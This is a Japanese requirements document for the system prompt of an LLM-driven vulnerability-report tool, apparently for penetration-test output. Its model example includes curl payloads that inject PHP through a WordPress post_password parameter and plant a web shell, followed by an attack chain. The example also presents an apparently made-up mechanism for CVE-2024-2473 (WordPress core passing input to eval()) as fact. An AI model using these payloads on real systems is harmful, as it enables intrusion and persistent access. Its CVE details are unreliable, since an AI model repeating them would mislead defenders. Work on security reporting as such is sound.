# ScannerAI-Pro Quality Improvement Requirements

## 現状の問題点

現在のOllama出力は以下の問題があります：
- CVEが単なるラベルとして使われ、技術的説明がない
- 一般的すぎる推奨事項（「WordPressを更新してください」など）
- スキャン結果の具体的証拠と脆弱性が紐付いていない
- 攻撃手法の実際のメカニズムが説明されていない
- 実行可能な検証コマンドがない

## 改善目標

Ollamaに高品質な脆弱性分析レポートを生成させるため、`app.py`のシステムプロンプトを以下の要件を満たすように更新してください。

---

## Ollamaシステムプロンプト要件

### 1. 証拠ベースのCVE分析（CVE禁止ではない）

**必須ルール:**
- CVEは専門的識別子として必ず使用する
- ただし、CVEを言及する際は必ず以下を含める：
  * 脆弱性の技術的メカニズム（何がどう動作するか）
  * スキャン結果のどこにその証拠があるか
  * なぜこのコンテキストで重要なのか

**悪い例:**
```
CVE-2024-2473が存在します。
```

**良い例:**
```
CVE-2024-2473: WordPress Post Password Bypass → 認証不要のRCE
技術的詳細: wp-admin/?action=postpassエンドポイントでpost_passwordパラメータの入力検証が不十分。PHPのeval()に渡される前にサニタイズされないため、任意のコードを注入可能。
スキャン証拠: nuclei出力の3行目で検出 - http://192.168.56.103/wp-admin/?action=postpass
影響範囲: 認証なしでWebサーバー権限でのシステムコマンド実行
```

### 2. 技術的深度の確保

各脆弱性について以下を説明すること：
- **プロトコルレベルの詳細**: HTTPメソッド、パラメータ、ヘッダー
- **攻撃者が実際に行う操作**: クリックするだけ？スクリプト必要？
- **なぜ防御が難しいか**: 標準的な対策が効かない理由
- **エクスプロイト後の展開**: 次に攻撃者は何ができるか

### 3. コンテキスト認識の攻撃チェーン

攻撃シナリオは実際のスキャン結果から構築すること：
- 発見されたユーザー名 → 認証攻撃の標的
- 露出しているディレクトリ → ファイルアップロード/トラバーサルの可能性
- サービスバージョン → バージョン固有のエクスプロイト
- リダイレクトパターン → バックドアの兆候

**各ステップは必ず具体的なスキャン結果を引用すること**

### 4. 二層構造のレポート

#### レイヤー1: プロフェッショナルサマリー
- CVE IDとCVSSスコア、CWE分類
- 明確な修復手順（バージョン番号付き）
- ビジネスインパクト評価

#### レイヤー2: 技術的詳細分析
- 攻撃ベクターの説明（エクスプロイトの仕組み）
- チェーニング機会（脆弱性A + 露出ディレクトリB = 完全侵害）
- 防御者の視点（なぜ標準的な軽減策が失敗するか）
- 攻撃者の次の手（ポストエクスプロイテーションパス）

### 5. 実行可能なインテリジェンス

一般的な推奨ではなく、以下を提供：
- **検証用の具体的コマンド**
- **調査すべき正確なファイルパス**
- **必要な設定変更の詳細**
- **各発見事項のテスト方法**

**悪い例:**
```
2FAを実装してください
```

**良い例:**
```
特定された'administrator'アカウントに2FAを有効化:
1. WP-CLIで実行: wp user meta update 1 two_factor_enabled 1
2. Security → Two-Factor設定で強制適用
3. 検証: wp user meta get 1 two_factor_enabled
4. 全管理者に展開: wp user list --role=administrator --field=ID | xargs -I {} wp user meta update {} two_factor_enabled 1
```

### 6. リスクスコアリングロジック

脆弱性の優先順位付け基準：
1. **エクスプロイタビリティ**: 公開エクスプロイト有無？認証必要？
2. **資産の重要性**: どのデータ/機能が露出？
3. **攻撃面**: 外部 vs 内部、ポート露出
4. **標的化の証拠**: ハニーポットデータ、ログイン失敗の痕跡

---

## 禁止パターン（AIは絶対に避けること）

- ❌ 技術的説明なしにCVEをリストアップ
- ❌ 「ソフトウェアを更新」のような詳細なし一般アドバイス
- ❌ 発見された資産を参照しない攻撃チェーン
- ❌ 検証方法のない修復手順
- ❌ データベースからコピペした脆弱性説明

---

## 必須出力構造

```
## 🚨 重大脆弱性（エクスプロイタビリティ × 影響度でランク付け）
[各エントリ: CVE → 技術メカニズム → スキャン証拠 → エクスプロイトシナリオ]

## 🎯 攻撃チェーン分析
[発見されたサービス/ディレクトリ/認証情報のみを使用した多段階パス]

## 🔬 技術的詳細分析
[上位3脆弱性のプロトコルレベル説明]

## ⚡ 即座の対応（検証コマンド付き）
[具体的で即座に実行可能なステップ - 一般的推奨ではない]

## 🧪 手動テストロードマップ
[スキャン結果 + 脆弱性タイプに基づいて次に調査すべきこと]

## 📋 修復計画（優先度順）
[バージョン番号、設定変更、アーキテクチャ改善]
```

---

## 出力品質メトリクス

生成されるレポートは以下を満たすべき：
- すべてのCVE言及に2-3文の技術説明が含まれる
- すべての修復手順が即座に実行可能（具体的コマンド/バージョン）
- 攻撃チェーンが最低3つの具体的スキャン結果を参照
- 「更新/パッチ」のような文脈なし一般アドバイスがない
- 技術用語が正確に使用される（RCE, XSS, SQLi等）

---

## 実装例の比較

### Before（現在の出力）
```
最も重大な攻撃ベクターはWordPress Post Pass脆弱性（CVE-2024-2473）です。
この中程度の脆弱性により、認証されていない攻撃者がwp-admin/?action=postpass
エンドポイントへの細工されたリクエストを介して任意のシェルコマンドを実行できます。

推奨事項:
1. WordPress Post Pass脆弱性のパッチ適用
2. 強力な認証と認可の実装
3. 包括的なセキュリティ監査の実施
```

### After（期待される出力）
```
## 🚨 Critical: CVE-2024-2473 - WordPress認証バイパス → RCE

### 技術的メカニズム
WordPress 5.8.1のpost password保護機能に入力検証の欠陥。
/wp-admin/?action=postpassエンドポイントがPOSTパラメータ'post_password'を
サニタイズせずにeval()関数に渡すため、PHPコードインジェクションが可能。

### スキャン証拠
- nuclei検出（3行目）: [CVE-2024-2473] [http] [medium] http://192.168.56.103/wp-admin/?action=postpass
- whatweb確認: WordPress[5.8.1] - 既知の脆弱バージョン
- gobuster発見: /wp-admin/ アクセス可能（301リダイレクト）

### エクスプロイト実証
```bash
# 脆弱性確認（リモートコマンド実行テスト）
curl -X POST http://192.168.56.103/wp-admin/?action=postpass \
  -d "post_password=';system('id');//" \
  -H "Content-Type: application/x-www-form-urlencoded"

# バックドア設置例
curl -X POST http://192.168.56.103/wp-admin/?action=postpass \
  -d "post_password=';file_put_contents('/var/www/html/wp-content/shell.php','<?php system(\$_GET[cmd]);?>');//"
```

### 攻撃チェーン
1. 初期侵入: CVE-2024-2473でRCE達成（認証不要）
2. 永続化: /wp-content/uploads/にPHPバックドア設置（gobusterで書き込み可能確認済み）
3. 権限昇格: wp-user-enumで特定された'administrator'アカウントのパスワードハッシュを
   データベースから抽出（www-data権限でMySQLアクセス可能）
4. 完全制御: 管理者セッションハイジャックで正規ログイン

### 即座の対応（優先度: CRITICAL）
```bash
# 1. 脆弱性の即座の無効化（15分以内）
echo "deny from all" > /var/www/html/wp-admin/.htaccess

# 2. バックドア探索（30分以内）
find /var/www/html -name "*.php" -mtime -7 -exec grep -l "eval\|base64_decode\|system" {} \;

# 3. WordPress緊急アップデート（1時間以内）
wp core update --version=5.8.3 --force
wp core verify-checksums  # 改ざん確認

# 4. 侵害確認
grep "POST /wp-admin/?action=postpass" /var/log/apache2/access.log | \
  awk '{print $1}' | sort | uniq -c | sort -rn  # 攻撃元IP特定
```

### 長期的修復（優先度順）
1. WordPress 5.8.3以上へアップグレード（入力サニタイゼーション実装済み）
2. WAF導入: ModSecurityでPOSTパラメータにPHPコード含む場合ブロック
3. ファイル整合性監視: AIDE/Tripwireで/wp-content/の改ざん検知
4. 最小権限原則: www-dataユーザーからMySQLへの直接アクセス無効化
```

---

## テスト基準

新しいシステムプロンプトは以下をパスすること：
1. ✅ 各CVEに3文以上の技術説明がある
2. ✅ 最低5つの具体的検証コマンドが含まれる
3. ✅ 攻撃チェーンがスキャン結果の具体的な行番号/ツール名を参照
4. ✅ 「更新してください」「パッチを当ててください」のみの文が存在しない
5. ✅ すべての修復手順に検証方法が付随

---

## 注意事項

- このドキュメントはOllama用のシステムプロンプト要件です
- 実装時はOllamaが理解できる形式に変換してください
- 使用するOllamaモデルは`llama3:70b`または`qwen2.5:32b`以上を推奨
- 小さいモデルでは複雑な指示を完全に理解できない可能性があります
